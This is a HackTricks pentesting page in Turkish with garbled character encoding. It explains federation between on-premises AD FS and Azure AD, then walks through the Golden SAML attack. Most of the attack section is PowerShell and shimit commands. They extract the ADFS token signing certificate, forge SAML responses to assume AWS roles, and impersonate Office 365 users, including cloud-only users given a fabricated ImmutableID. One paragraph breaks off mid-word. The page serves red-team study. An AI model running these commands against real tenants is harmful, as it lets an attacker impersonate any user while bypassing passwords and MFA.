# Federasyon

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki Ã¶zel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± takip edin.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek katkÄ±da bulunun.

</details>

## Temel Bilgiler

[DokÃ¼mantasyondan:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federasyon**, **gÃ¼ven** saÄŸlamÄ±ÅŸ olan **alanlarÄ±n** bir koleksiyonudur. GÃ¼ven seviyesi deÄŸiÅŸebilir, ancak genellikle **kimlik doÄŸrulama**yÄ± ve neredeyse her zaman **yetkilendirme**yi iÃ§erir. Tipik bir federasyon, bir dizi kaynaÄŸa **paylaÅŸÄ±lan eriÅŸim** iÃ§in **gÃ¼ven** saÄŸlamÄ±ÅŸ olan bir **dizi organizasyonu** iÃ§erebilir.

On-premises ortamÄ±nÄ±zÄ± Azure AD ile **federasyonlaÅŸtÄ±rabilir** ve bu federasyonu kimlik doÄŸrulama ve yetkilendirme iÃ§in kullanabilirsiniz. Bu oturum aÃ§ma yÃ¶ntemi, tÃ¼m kullanÄ±cÄ± **kimlik doÄŸrulamalarÄ±nÄ±n on-premises ortamda** gerÃ§ekleÅŸtiÄŸini saÄŸlar. Bu yÃ¶ntem, yÃ¶neticilerin daha sÄ±kÄ± eriÅŸim kontrol dÃ¼zeyleri uygulamasÄ±na olanak tanÄ±r. AD FS ve PingFederate ile federasyon saÄŸlanabilir.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

Temel olarak, Federasyon'da tÃ¼m **kimlik doÄŸrulama** on-premises ortamÄ±nda gerÃ§ekleÅŸir ve kullanÄ±cÄ±lar gÃ¼vendiÄŸi tÃ¼m ortamlarda SSO deneyimi yaÅŸar. Bu nedenle, kullanÄ±cÄ±lar **on-prem kimlik bilgilerini** kullanarak **bulut** uygulamalarÄ±na eriÅŸebilir.

**GÃ¼venlik Bildirimi Ä°ÅŸaretleme Dili (SAML)**, saÄŸlayÄ±cÄ±lar arasÄ±nda tÃ¼m kimlik doÄŸrulama ve yetkilendirme bilgilerinin **deÄŸiÅŸ tokuÅŸu** iÃ§in kullanÄ±lÄ±r.

Herhangi bir federasyon kurulumunda Ã¼Ã§ taraf bulunur:

* KullanÄ±cÄ± veya Ä°stemci
* Kimlik SaÄŸlayÄ±cÄ± (IdP)
* Hizmet SaÄŸlayÄ±cÄ± (SP)

(Resimler https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps adresinden alÄ±nmÄ±ÅŸtÄ±r)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. Ä°lk olarak, bir kullanÄ±cÄ± tarafÄ±ndan bir uygulama (AWS konsolu veya vSphere web istemcisi gibi Hizmet SaÄŸlayÄ±cÄ± veya SP) eriÅŸilir. Bu adÄ±m, Ã¶zel uygulamaya baÄŸlÄ± olarak, istemciyi doÄŸrudan IdP'ye (Kimlik SaÄŸlayÄ±cÄ±) yÃ¶nlendirebilir.
2. ArdÄ±ndan, SP, kullanÄ±cÄ± kimlik doÄŸrulamasÄ± iÃ§in uygun IdP'yi (Ã¶rneÄŸin, AD FS, Okta) belirler. ArdÄ±ndan, bir SAML (GÃ¼venlik Bildirimi Ä°ÅŸaretleme Dili) AuthnRequest oluÅŸturur ve istemciyi seÃ§ilen IdP'ye yÃ¶nlendirir.
3. IdP, kullanÄ±cÄ±yÄ± kimlik doÄŸrulayarak devralÄ±r. Kimlik doÄŸrulama sonrasÄ±nda, bir SAMLResponse, IdP tarafÄ±ndan formÃ¼le edilir ve kullanÄ±cÄ± aracÄ±lÄ±ÄŸÄ±yla SP'ye iletilir.
4. Son olarak, SP, SAMLResponse'u deÄŸerlendirir. IdP ile gÃ¼ven iliÅŸkisini doÄŸrulayan baÅŸarÄ±lÄ± bir ÅŸekilde doÄŸrulandÄ±ÄŸÄ±nda, kullanÄ±cÄ± eriÅŸime izin verilir. Bu, oturum aÃ§ma iÅŸleminin tamamlanmasÄ± anlamÄ±na gelir ve kullanÄ±cÄ±nÄ±n hizmeti kullanmasÄ±na olanak tanÄ±r.

**SAML kimlik doÄŸrulamasÄ± ve yaygÄ±n saldÄ±rÄ±lar hakkÄ±nda daha fazla bilgi edinmek isterseniz:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS, iddialara dayalÄ± bir kimlik modelidir.
* "..iddialar, kullanÄ±cÄ±lar hakkÄ±nda yapÄ±lan (Ã¶rneÄŸin, ad, kimlik, grup gibi) beyanlardÄ±r ve Ã§oÄŸunlukla Ä°nternet'teki herhangi bir yerde bulunan iddialara dayalÄ± uygulamalara eriÅŸimi yetkilendirmek iÃ§in kullanÄ±lÄ±r."
* Bir kullanÄ±cÄ±nÄ±n iddialarÄ±, SAML belgelerinin iÃ§ine yazÄ±lÄ±r ve ardÄ±ndan IdP tarafÄ±ndan gizlilik saÄŸlamak iÃ§in imzalanÄ±r.
* Bir kullanÄ±cÄ±, ImmutableID tarafÄ±ndan tanÄ±mlanÄ±r. Bu, kÃ¼resel olarak benzersizdir ve Azure AD'de depolanÄ±r.
* ImmutableID, kullanÄ±cÄ± iÃ§in Azure AD'de saklanan bir on-premises asms-DS-ConsistencyGuid olabilir ve/veya kullanÄ±cÄ±nÄ±n GUID'inden tÃ¼retilebilir.
* Daha fazla bilgi iÃ§in [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims) adresine bakÄ±n

**Golden SAML saldÄ±rÄ±sÄ±:**

* ADFS'de, SAML YanÄ±tÄ± bir belge imzalama sertifikasÄ±yla imzalanÄ±r.
* Sertifika tehlikeye atÄ±lÄ±rsa, Azure AD'ye senkronize edilen HERHANGÄ° bir kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak mÃ¼mkÃ¼n olur!
* PTA kÃ¶tÃ¼ye kullanÄ±mÄ±mÄ±z gibi, bir kullanÄ±cÄ± iÃ§in ÅŸifre deÄŸiÅŸikliÄŸi veya MFA'nÄ±n herhangi bir etkisi olmayacaktÄ±r Ã§Ã¼nkÃ¼ kimlik doÄŸrulama yanÄ±tÄ±nÄ± sahtecilik ediyoruz.
* Sertifika, DA ayrÄ±calÄ±klarÄ±yla AD FS sunucusundan Ã§Ä±karÄ±labilir ve ardÄ±ndan herhangi bir internete baÄŸlÄ± makineden kullanÄ±labilir.
* Daha fazla bilgi iÃ§in [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps) adresine bakÄ±n

### Golden SAML

Bir **Kimlik SaÄŸlayÄ±cÄ± (IdP)**'nin kullanÄ±cÄ± oturum aÃ§masÄ±nÄ± yetkilendirmek iÃ§in bir **SAMLResponse** Ã¼retmesi iÅŸlemi Ã¶nemlidir. IdP'nin belirli uygulamasÄ±na baÄŸlÄ± olarak, yanÄ±t, IdP'nin Ã¶zel anahtarÄ±nÄ± kullanarak **imzalanmÄ±ÅŸ** veya **ÅŸifrelenmiÅŸ** olabilir. Bu iÅŸlem, Hizmet SaÄŸlayÄ±cÄ±'nÄ±n (SP) SAMLResponse'un ot
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
TÃ¼m bilgilerle, [**shimit**](https://github.com/cyberark/shimit) kullanarak taklit etmek istediÄŸiniz kullanÄ±cÄ± olarak geÃ§erli bir SAMLResponse'u unutmak mÃ¼mkÃ¼ndÃ¼r:

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### On-prem -> buluta
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
AyrÄ±ca, yalnÄ±zca bulut kullanÄ±cÄ±larÄ±nÄ±n ImmutableID'sini oluÅŸturmak ve onlarÄ± taklit etmek mÃ¼mkÃ¼ndÃ¼r.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Referanslar

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>A'dan Z'ye AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** isterseniz, [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
